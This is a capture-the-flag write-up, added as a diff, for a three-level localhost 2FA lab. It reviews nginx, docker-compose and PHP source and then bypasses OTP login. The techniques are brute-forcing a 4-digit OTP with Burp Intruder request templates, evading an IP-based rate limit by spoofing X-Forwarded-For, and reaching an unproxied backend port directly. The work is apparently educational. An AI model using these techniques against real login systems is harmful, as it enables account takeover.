@@ -1,0 +1,330 @@
+[Level 1]
+
+[*] Target: http://localhost:4201/
+
+    The first thing you need to care about when looking at an nginx server is its config file, let's break down each part together
+
+        [+] proxy/nginx.conf
+
+            server {
+                listen 80; // [?] Specifies that the server should listen on port 80
+                
+                server_name _; 
+                
+                /* [?] Directive sets the name of the server ( the underscore is a wildcard that matches any hostname)
+                       => This means that this server block will respond to requests regardless of the domain name used to access it. */
+                
+                location / {
+                    proxy_pass http://web; // [?] forwarding those requests to another server named "web" 
+                }
+            }
+
+        => Okay! I know what ya thinking 'what is "web", where did it come from (~.~!)'
+
+        [+] docker-compose.yaml
+
+            ...
+            web:
+                container_name: 2FA_level1_web
+                depends_on:
+                    - database
+                build: ./web
+                environment:
+                    - MYSQL_HOSTNAME=database
+                    - MYSQL_DATABASE=myDB
+                    - MYSQL_USER=db_user
+                    - MYSQL_PASSWORD=db_password
+            ...
+
+        => Yeah! I know that this "web" is in the docker-compose.yaml isn't exactly "web" in the Nginx.conf, but from these, docker builds the "web"
+
+    [?] For someone who doesn't know about proxy servers, you can understand how things work like this
+
+            +-----------+       +-----------+       +------------+
+            |    You    | <---> |   Proxy   | <---> |  Internet  |
+            +-----------+       +-----------+       +------------+
+
+    - Next is a bunch of js and css files, you don't need to care about this (just front-end stuff)
+
+    - Now, we gonna focus on our main characters
+
+        [+] connect_db.php
+
+            <?php
+            $host         = getenv("MYSQL_HOSTNAME"); // Just set the env parameters which in the docker-compose.yaml
+            $db           = getenv("MYSQL_DATABASE");
+            $user         = getenv("MYSQL_USER");
+            $password     = getenv("MYSQL_PASSWORD");
+
+            // Create connection
+            try {
+            $conn = new mysqli($host, $user, $password, $db); // mysql() can be used to connect to your db (of course you must provide the credentials)
+            } catch (Exception $e) {
+            die("Connection error: " . $e->getMessage());
+            }
+
+        [+] index.php (hehe! I know what you thinking but this time SQLi isn't going to work)
+
+            <?php
+            include("connect_db.php");
+            if (isset($_POST['phone']) and isset($_POST['otp'])) {
+            $time = date("Y-m-d H:i:s");
+            $phone = $conn->real_escape_string($_POST['phone']); 
+            
+            // [?] real_escape_string(): This helps prevent SQL injection attacks by ensuring that user-inputted data is properly sanitized 
+                                         before being used in database queries.
+        
+            $otp = $conn->real_escape_string($_POST['otp']);
+
+            $sql = "SELECT * FROM Users WHERE phone_number='$phone' AND otp='$otp';";
+            $result = $conn->query($sql);
+
+            $info = "";
+            if ($result->num_rows > 0) {
+                while ($row = $result->fetch_assoc()) {
+                if ((strtotime($time) - strtotime($row['opt_created_time'])) > 900) {
+
+                // [?] strtotime(): This function is used to convert the string representation of a date and time (in the variable $time) into a Unix timestamp. 
+                                    The Unix timestamp represents the number of seconds since the Unix Epoch (January 1, 1970).
+
+                //Just a reminder 'opt_created_time' is a row's name in the Users database
+
+                    $info = "<pre>Token is expired</pre>";
+                } else {
+                    if ($row['phone_number'] === '0123456789') { // [?] This is something like the admin's phone number right (~.~!)
+                    $info .= "<pre>Login successful</pre>";
+                    $info .= "<br>";
+                    $info .= "<pre>CBJS{FAKE_FLAG_FAKE_FLAG}</pre>";
+                    } else {
+                    $info = "<pre>Login successful</pre>";
+                    }
+                }
+                }
+            } else {
+                $info = "<pre>User not exist or OTP is wrong</pre>";
+            }
+            } ...
+
+        [+] gen_otp.php
+
+            ...
+            $info = "";
+            function generateOTP($digits = 4) // [?] so the OTP will be a random 4-digits number
+            {
+                $i = 0;
+                $otp = "";
+                while ($i < $digits) {
+                    $otp .= mt_rand(0, 9);
+                    $i++;
+                }
+                return $otp;
+            }
+            ...
+    
+    - This should be easy since there is no rate limit, we can easily brute force the 4-digit OTP and login as admin via the phone number we already know
+
+        [?] You might want to use the "sniper" mode in the intruder since it was bornt for single target brute force
+
+            POST / HTTP/1.1
+            Host: localhost:4201
+            User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            ...
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 25
+            Origin: http://localhost:4201
+            Connection: close
+            Referer: http://localhost:4201/index.php
+            ...
+            Sec-Fetch-Site: same-origin
+            Sec-Fetch-User: ?1
+
+            phone=0123456789&otp=§target§
+
+    [?] About wordlist, you can use OTP_Generator.py to create OTP.txt which contains all 4-digit format numbers from '0000' to '9999'
+
+    => We can easily find the result via the response's length (in my case it is 4105)
+
+    [Final result: Login successful] CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:4202/
+
+    - Now! Still the same way we did in the previous level, look at the nginx.conf file
+
+        [+] nginx.conf
+
+            server {
+                listen 80;
+                server_name _;
+                
+                location / {
+                    proxy_pass http://web;
+                    proxy_set_header Host $host;
+                    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  // [?] just add some headers before sending the http request to the server
+                }
+            }
+
+        [?] For someone who doesn't know! This is the header that contains IP in an HTTP request
+
+    - gen_opt.php and index.php are just the same, so we will not deep dive into what's happened there
+
+    - However, rate_limit.php is where the fun begins
+
+        <?php
+        $redis = new Redis();
+
+        // [?] Redis is an in-memory data structure store that can be used as a database, cache, and message broker
+               PHP Redis allows PHP developers to integrate and interact with Redis server
+
+        $redis->connect('redis', 6379);
+        $redis->auth('eYVX7EwVmmxKPCDmwMtyKVge8oLd2t81');
+
+        $max_calls_limit  = 5;
+        $time_period      = 3;
+        $total_user_calls = 0;
+
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) { // [?] As I said, server take the information about our IP via headers which might be added by the proxy
+            $user_ip_address = $_SERVER['HTTP_CLIENT_IP']; // [?] In this case if our Client-IP header isn't null, $user_ip_address will contain the IP in that header
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $user_ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $user_ip_address = $_SERVER['REMOTE_ADDR']; 
+        }
+
+        if (!$redis->exists($user_ip_address)) { // [?] Check if the key (user's IP address) exists in Redis! just memory data stuff
+            $redis->set($user_ip_address, 1); 
+            $redis->expire($user_ip_address, $time_period);
+            $total_user_calls = 1;
+        } else {
+            $redis->INCR($user_ip_address); // [?] Increments the value associated with the user's IP address in Redis by 1 using the INCR command
+            $total_user_calls = $redis->get($user_ip_address);
+            if ($total_user_calls > $max_calls_limit) {
+                echo "User " . $user_ip_address . " limit exceeded.";
+                exit();
+            }
+        }
+
+    - Cool! So in this case, we can only send a maximum of 5 requests every 3 seconds WITH OUR OWN IP ADDRESS 
+
+        -> Hehe (^.^!) I think you can guess what I'm going to do
+
+                POST / HTTP/1.1
+                Host: localhost:4202
+                ....
+                Content-Length: 25
+                Origin: http://localhost:4202
+                X-Forwarded-For:§random_IP§  // [?] We need to proactively control the IP right 
+                Connection: close
+                Referer: http://localhost:4202/
+                ...
+
+                phone=0123456789&otp=§target§   
+
+    - You already have the OTP.txt from the previous level, and about the IP wordlist you can run the IPv4_Generator.py to have 10000 random unique IPs
+
+    - BUT! instead of brute forcing like a normal person, you can use my tool which is designed to gather the correct OTP for this lab only
+
+        (base) bigbox@ubuntu:~/Desktop$ python3 War_Machine.py
+        
+        Requirement already satisfied: pyfiglet in /home/bigbox/miniconda3/lib/python3.11/site-packages (1.0.2)
+        ...
+        Requirement already satisfied: certifi>=2017.4.17 in /home/bigbox/miniconda3/lib/python3.11/site-packages (from requests) (2023.11.17)
+        __        __           __  __            _     _            
+        \ \      / /_ _ _ __  |  \/  | __ _  ___| |__ (_)_ __   ___ 
+         \ \ /\ / / _` | '__| | |\/| |/ _` |/ __| '_ \| | '_ \ / _ \
+          \ V  V / (_| | |    | |  | | (_| | (__| | | | | | | |  __/
+           \_/\_/ \__,_|_|    |_|  |_|\__,_|\___|_| |_|_|_| |_|\___|
+                                                                    
+
+        [+] Enter the target's phone number (Example: 0395136460): 0123456789
+
+        [-] Login Failed! 0001 isn't the correct OTP 
+
+        ...
+
+        [-] Login Failed! 7848 isn't the correct OTP 
+
+        [+] Login Successful! Found the target's OTP: 7849 
+
+    [Final result: Login successful] CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:4203/
+
+    - Okay! We are finally here, the last level, however, first things first
+
+        [+] nginx.conf
+
+            limit_req_zone $binary_remote_addr zone=one:10m rate=15r/s;
+
+            // [?] This line sets up a shared memory zone named "one" to store information related to rate-limiting
+                   The zone has a size of 10 megabytes, and the rate is limited to 15 requests per second
+
+            server {
+                listen 80;
+                server_name _;
+
+                limit_req zone=one burst=20 nodelay;
+                limit_req_status 429; // [?] 429 Too many requests
+
+                // [?] Applies rate limiting using the previously defined zone "one." It allows requests to burst up to 20 requests before enforcing the rate limit
+                       "nodelay" parameter means that exceeding the limit won't introduce delays
+
+                location / {
+                    proxy_pass http://web;
+                    proxy_set_header Host $host;
+                    proxy_set_header X-Real-IP $remote_addr;
+                    proxy_set_header X-Forward-For $proxy_add_x_forwarded_for; 
+                }
+            }
+
+            => No rate limit for each IP, this time if we try to do the brute force way like the previous labs, things gonna look like a consequence of a DDOS attack
+
+            => And yep! I tried -> HTTP/1.1 429 Too Many Requests
+
+        [+] connect_db, gen_otp, index just are the same, and no rate_limit
+
+    - However, I found some really cool stuff in the Dockerfile
+
+        [+] Dockerfile
+
+            ...
+            proxy:
+                container_name: 2FA_level3_proxy
+                ports:
+                - "4203:80"
+                image: nginx:stable
+                volumes:
+                - ./proxy/nginx.conf:/etc/nginx/conf.d/default.conf
+                restart: always
+
+            web:
+                container_name: 2FA_level3_web
+                depends_on:
+                - database
+                ports:
+                - "4204:80"
+                build: ./web
+                ...
+
+        => This means this web server not only opens the proxy port but also its own port and in this case we can access it via our own 4204 (~.~!)
+
+        - Just like what you are thinking, Nginx server is now playing the role of a reverse proxy, and nginx.conf is not related to port 80 of the web
+
+            => Yep! Smart guy, we can brute force the OTP normally via port 4204
+
+        - Using the same method we did in the first lab (phone = 0123456789 & otp = 7763 -> Login successful)
+
+    [Final result: Login successful] CBJS{FAKE_FLAG_FAKE_FLAG}
+
